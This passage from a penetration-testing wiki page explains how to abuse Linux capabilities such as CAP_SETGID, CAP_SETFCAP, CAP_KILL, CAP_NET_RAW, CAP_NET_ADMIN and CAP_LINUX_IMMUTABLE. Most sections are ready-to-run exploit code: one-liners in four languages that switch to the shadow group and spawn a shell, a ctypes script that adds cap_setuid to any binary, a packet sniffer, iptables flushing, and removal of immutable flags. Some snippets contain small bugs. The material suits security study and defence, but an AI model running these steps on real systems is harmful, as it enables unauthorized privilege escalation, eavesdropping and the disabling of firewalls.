**This means that it's possible to set the effective group id of the created process.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_setgid+ep
```

In this case you should look for interesting files that a group can read/write because you can impersonate any group:

```bash
#Find every file writable by a group
$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Find the group id of the targeted group

```bash
$ cat /etc/group
[...]
shadow:x:42:
[...]
```

We can spawn a shell with the targeted GID&#x20;

```bash
$ python -c 'import os; os.setgid(42); os.system("/bin/bash")'
```
{% endtab %}

{% tab title="Exploit - Ruby" %}
In the following example the **`ruby`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/ruby = cap_setgid+ep
```

In this case you should look for interesting files that a group can read/write because you can impersonate any group:

```bash
#Find every file writable by a group
$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Find the group id of the targeted group

```bash
$ cat /etc/group
[...]
shadow:x:42:
[...]
```

We can spawn a shell with the targeted GID&#x20;

```bash
$ ruby -e 'Process::Sys.setgid(42); exec "/bin/sh"'
```
{% endtab %}

{% tab title="Exploit - Perl" %}
In the following example the **`perl`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setgid+ep
```

In this case you should look for interesting files that a group can read/write because you can impersonate any group:

```bash
#Find every file writable by a group
$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Find the group id of the targeted group

```bash
$ cat /etc/group
[...]
shadow:x:42:
[...]
```

We can spawn a shell with the targeted GID&#x20;

```bash
$ perl -e 'use POSIX (setgid); POSIX::setgid(42); exec "/bin/bash";'
```
{% endtab %}

{% tab title="Exploit - PHP" %}
In the following example the **`php`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/php8.2 = cap_setgid+ep
```

In this case you should look for interesting files that a group can read/write because you can impersonate any group:

```bash
#Find every file writable by a group
$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Find the group id of the targeted group

```bash
$ cat /etc/group
[...]
shadow:x:42:
[...]
```

We can spawn a shell with the targeted GID&#x20;

```bash
$ php -r "posix_setgid(42); system('/bin/bash');"
```
{% endtab %}
{% endtabs %}

#### CAP\_SETFCAP

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SETFCAP**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to set arbitrary capabilities on a file.

**This means that it's possible to set capabilities on files and processes**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_setfcap+ep
```

We can abuse it to add the cap\_setuid capability to the binary of our choice. To exploit, we can use the following script&#x20;

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```
{% endcode %}

Execute it on the file of your choice

```bash
$ python3.11 setcapability.py '/usr/bin/ruby' 
```

{% hint style="danger" %}
Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
{% endhint %}

Once you have [SETUID capability](capabilities.md#cap\_setuid) you can go to its section to see how to escalate privileges.
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_RAWIO

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_RAWIO** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.

This can be useful for **privilege escalation** and **Docker breakout.**
{% endtab %}
{% endtabs %}

#### CAP\_KILL

{% tabs %}
{% tab title="Desc" %}
[**CAP\_KILL** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to bypass permission checks for sending signals (see [kill(2)](https://man7.org/linux/man-pages/man2/kill.2.html)). This includes use of the[ ioctl(2)](https://man7.org/linux/man-pages/man2/ioctl.2.html) KDSIGACCEPT operation.

**This means that it's possible to kill any process.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_kill+ep
```

If there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.

```bash
$ cat exploit.py
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341) #this is the node.js pid
os.killpg(pgid, signal.SIGUSR1) 

# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
$ python exploit.py
```
{% endtab %}
{% endtabs %}

#### CAP\_NET\_BIND\_SERVICE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_NET\_BIND\_SERVICE** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to Bind a socket to Internet domain privileged ports (port numbers less than 1024).

**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_net_bind_service+ep
```

Then, we are able to listen on any port&#x20;

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

And connect from it to any othe port

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

#### CAP\_NET\_RAW

{% tabs %}
{% tab title="Desc" %}
[**CAP\_NET\_RAW** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allows a process to be able to **create RAW and PACKET socket types** for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or **compromised container** to **spoof** **packets** at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.

**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/sbin/python2.7 = cap_net_raw+ep
```

We are able to run the following code and sniff traffic of the "**lo**" (**localhost**) interface.&#x20;

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```
{% endtab %}

{% tab title="Exploit - Tcpdump" %}
In the following example the **`tcpdump`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Then, we can sniff sensitive information by running tcpdump for a while.

```python
tcpdump -i lo -A
```
{% endtab %}
{% endtabs %}

#### CAP\_NET\_ADMIN + CAP\_NET\_RAW

{% tabs %}
{% tab title="Desc" %}
[**CAP\_NET\_ADMIN** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allows the capability holder to **modify the exposed network namespaces' firewall, routing tables, socket permissions**, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to **enable promiscuous mode** for the attached network interfaces and potentially sniff across namespaces.
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/sbin/python2.7 = cap_net_raw,cap_net_admin+ep
```

We can run following code to dump iptables filter table rules.&#x20;

```python
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)
```

Or flush iptables filter table

```python
import iptc
iptc.easy.flush_table('filter')
```
{% endtab %}
{% endtabs %}

#### CAP\_LINUX\_IMMUTABLE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_LINUX\_IMMUTABLE** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to set the FS\_APPEND\_FL and FS\_IMMUTABLE\_FL inode flags

If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/sbin/python2.7 = cap_linux_immutable+ep
```

If you find that a file is immutable, you can **remove the immutable attribute and make the file modifiable:**

```bash
#Check that the file is imutable
lsattr file.sh 
----i---------e--- backup.sh
```

We can use the following script to remove the attribute

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

{% hint style="info" %}
Note that usually this immutable attribute is set and remove using:

sudo chattr +i file.txt&#x20;

sudo chattr -i file.txt
{% endhint %}
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_CHROOT



#### CAP\_SYS\_BOOT

#### CAP\_SYSLOG

#### CAP\_MKNOD

#### CAP\_SETPCAP

## References

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities" %}

{% embed url="https://blog.ploetzli.ch/2014/understanding-linux-capabilities/" %}
